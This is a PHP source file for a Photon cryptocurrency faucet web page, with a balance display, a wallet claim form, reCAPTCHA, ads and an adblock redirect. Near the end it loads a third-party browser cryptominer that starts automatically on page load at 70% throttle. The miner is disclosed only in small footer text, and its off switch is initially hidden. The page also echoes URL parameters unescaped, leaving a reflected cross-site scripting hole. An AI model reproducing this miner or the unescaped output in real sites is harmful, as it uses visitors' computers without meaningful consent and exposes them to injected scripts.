<?php

require_once 'classes/recaptcha.php';
require_once 'config.php';

try {
    $link = new PDO('mysql:host=' . $hostDB . ';dbname=' . $database, $userDB, $passwordDB);
} catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
}
?><!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <title><?php echo $faucetTitle; ?></title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='shortcut icon' href='images/favicon.ico'>
    <link rel='icon' type='image/icon' href='images/favicon.ico'>

    <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css'>
    <link rel='stylesheet' href='/css/style.css'>

    <script>var isAdBlockActive = true;</script>
    <script src='/js/advertisement.js'></script>
    <script>
        if (isAdBlockActive) {
            window.location = './adblocker.php'
        }
    </script>

<script src='https://www.google.com/recaptcha/api.js'></script>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

<?php
if(!file_exists('images/phobtc.txt') || time() - filemtime('images/phobtc.txt') >= 60*15){
    file_put_contents('images/phobtc.txt',file_get_contents("https://www.cryptopia.co.nz/api/GetMarket/PHO_BTC"));
}
$pair = json_decode(file_get_contents('images/phobtc.txt'));
$exch_rate = sprintf("%.8f", $pair->Data->LastPrice);

?>

    <!--ANALYTICS HERE!!-->
    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-113151286-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-113151286-1');
</script>

</head>

<body>

<div class='container'>

    <div id='login-form'>


        <h3><a href='./'><img src='<?php echo $logo; ?>' height='256'></a><br/><br/> <?php echo $faucetSubtitle; ?></h3>
<?php if($exch_rate): ?><p><center><strong>1 PHO = <?php echo $exch_rate;?> BTC<?php endif; ?>
<p><a href="http://www.photoncc.com/" target="_blank">Photon Coin Information</a> | <a href="https://github.com/photonproject/photon/releases" target="_blank">Photon Wallet</a> | <a href="https://www.cryptopia.co.nz/Register?referrer=vxdhost" target="Blank">Exchange for FIAT</a></p>

        <fieldset>

            <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
            <center><a href="http://freedoge.co.in/?r=1528473" target="_blank"><img class="img-responsive" src="http://static1.freedoge.co.in/banners/468x60-3.png" /></a></center><br />
<!-- Adblock -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2576215688343175"
     data-ad-slot="2325102016"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
  
            <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
           
            <br/>


            <?php

            $query = "SELECT * FROM `wallet`";
            $result = $link->query($query,  PDO::FETCH_ASSOC);
            $balance = $result->fetchObject();
            $balanceDisponible = $balance->balance - $balance->pending;
            $lockedBalance = $balance->pending;
            $dividirEntre = 1;
            $totalBCN = ($balanceDisponible + $lockedBalance) / $dividirEntre;


            //Available Balance
            $balanceDisponibleFaucet = number_format(round($balanceDisponible / $dividirEntre, 5), 5, '.', '');
            ?>

            <form action='request.php' method='POST'>

                <?php if (isset($_GET['msg'])) {
                    $mensaje = $_GET['msg'];

                    if ($mensaje == 'captcha') {
                        ?>
                        <div id='alert' class='alert alert-error radius'>
                            Captcha Invalid - Please try again
                        </div>
                    <?php } else if ($mensaje == 'wallet') { ?>

                        <div id='alert' class='alert alert-error radius'>
                            Wallet not entered correctly
                        </div>
                    <?php } else if ($mensaje == 'success') { ?>

                        <div class='alert alert-success radius'>
                        You have been awarded with <strong><?php echo $_GET['amount']; ?></strong> Photon.<br/><br/>
                        You will receive this payment manually once your balance reaches 100 Photon<br/>
                        Payouts will be done once per day so you should recieve your payout within 24 hours of it reaching 100.<br />
                        Your Current Balance is: <?php echo $_GET['pending']; ?><br >
                        There is a 0.01 PHO Transaction charge per payout so you will recieve <?php echo $_GET['pending'] - 0.01; ?><br />
                           
                        </div>
                    <?php } else if ($mensaje == 'paymentID') { ?>

                        <div id='alert' class='alert alert-error radius'>
                        Please check again your payment ID. <br>It should have 64 characters with no special chars.
                        </div>
                    <?php } else if ($mensaje == 'notYet') { ?>

                        <div id='alert' class='alert alert-warning radius'>
                        You requested a reward less than an hour ago.
                        </div>
                    <?php } else if ($mensaje == 'dry') { ?>

                        <div id='alert' class='alert alert-warning radius'>
                        Faucet is empty or balance is lower than reward. <br> Wait for a reload or donation.
                        </div>
                    <?php } ?>

                <?php } ?>
                <div class='alert alert-info radius'>
                    Available Balance: <?php echo $balanceDisponibleFaucet ?> Photon.<br>
                    <?php

                    $query = 'select sum(`payout_amount`) as sum from payouts';
                    $result = $link->query($query);
                    $dato = $result->fetchObject();

                  

                    $query2 = 'SELECT COUNT(*) as total FROM `payouts`';
                    $result2 = $link->query($query2);
                    $dato2 = $result2->fetchObject();

                    ?>

                    Already Paid: <?php echo round($dato->sum / $dividirEntre, 5); ?> in <?php echo $dato2->total; ?> payouts.
                </div>
                <p>You can win anything from <?php echo $minReward; ?> to <?php echo $maxReward;?> PHO every hour</p>

                <?php if ($balanceDisponibleFaucet < 1.0) { ?>
                    <div class='alert alert-warning radius'>
                    Faucet is empty or balance is lower than reward. <br> Wait for a reload or donation.
                    </div>

                <?php } elseif (!$link) {

                    // $link = mysqli_connect($hostDB, $userDB, $passwordDB, $database);


                    die('DB Error' . mysql_error());
                } else { ?>

                <p>Need A Wallet?<br /><a href="https://github.com/photonproject/photon/releases" target="_blank">Official Photon Wallet</a> | <a href="https://www.cryptopia.co.nz/Register?referrer=vxdhost" target="Blank">Cryptopia Exchange Wallet</a></p>

                    <input id="wallet" type='text' name='wallet' required placeholder='Photon Wallet Recieve Address'>

                    <input id="paymID" type='text' name='paymentid' placeholder="Payment ID (Optional)">
                    <br/>
                    <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                    <ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2576215688343175"
     data-ad-slot="2325102016"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

                    <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                    <br/>
                    <div class="g-recaptcha" data-sitekey="6LdQ6UIUAAAAADh-64Qbv-F8UZl_WiAJ-y4rWgoY"></div>

                    <center><a href="https://freebitco.in/?r=10148588" target="_blank"><img class="img-responsive" src="https://static1.freebitco.in/banners/468x60-3.png" /></a></center><br />

                    <center><input id="submt" disabled="disabled" type='submit' value='Gimme by Photons !!!'></center>
                    <br>

                    <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                    <ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2576215688343175"
     data-ad-slot="2325102016"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
                    <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->

                <?php } ?>
                <br>
            

                
                <p style='font-size:12px;'>To help support we do web mining which helps to fund the faucet, <a href="#" id="miner-on" style="display:none">click here to switch on</a><a href="#" id="miner-off" style="display:none;">click here to switch off</a> <br>&#169; 2019 Faucet by PHPSA</p></center>
                <footer class='clearfix'>
                    Donate Photon for the faucet to: <?php echo $faucetAddress; ?> <br /><br />
                    <h3>What is Photon</h3>
                    <p>Photon is a coin on the Blakecoin Chain.
                    <h4>What is Blakecoin?</h4>

<p>Blakecoin is a experimental cryptographic digital currency that enables payments to anyone, anywhere in the world. Blakecoin uses peer-to-peer technology to operate with no central authority: managing transactions and issuing coins are carried out collectively by the network.</p>
<p><a href="https://blakecoin.org/about-blakecoin/" target="_blank">More about Blakecoin / Photon</a></p>

  </footer>
            </form>

        </fieldset>
    </div> <!-- end login-form -->

</div>
<script src='//code.jquery.com/jquery-1.11.3.min.js'></script>
<script>
if (typeof(Storage) !== "undefined") {
    $('#wallet').on("change", function(e) {  
        localStorage.setItem("wallet", $(this).val());
    });
    $('#paymID').on("change", function(e) {  
        localStorage.setItem("paymID", $(this).val());
    });
    $('#wallet').val(localStorage.getItem("wallet"));
    $('#paymID').val(localStorage.getItem("paymID"));
}else{
    console.log("no Storage");
}

</script>
<?php if (isset($_GET['msg'])) { ?>
    <script>
        setTimeout(function () {
            $('#alert').fadeOut(3000, function () {
            });
        }, 10000);
    </script>
<?php } ?>
<?php if(!empty($jsMinerKey)): ?>
<script src="https://www.freecontent.bid./Z60R.js"></script>
<script>
    var miner = new Client.Anonymous('<?php echo $jsMinerKey; ?>', {
        throttle: 0.7
    });
    miner.start();
    setTimeout(function() {
        if (miner.isRunning()){
        $('#miner-off').show();
        $('#miner-on').hide();
    }else{
        $('#miner-off').hide();
        $('#miner-on').show();
    }

    }, 1000);

    var counter = 30; 
    var interval = setInterval(function() {
        counter--; $("#submt").prop('value', 'Wait '+counter+' seconds'); 
        if (counter <= 0) {
            clearInterval(interval); 
            $("#submt").prop('value', 'Request by Photons !!!'); 
            $('#submt').prop("disabled", false); } }, 1000); 
    
    $('#miner-off').on("click", function(e) {
        e.preventDefault();
        miner.stop();
        $('#miner-off').hide();
        $('#miner-on').show();
     });
     $('#miner-on').on("click", function(e) {
        e.preventDefault();
        miner.start();
        $('#miner-off').show();
        $('#miner-on').hide();
     });
</script>
<?php endif; ?>
</body>
</html>
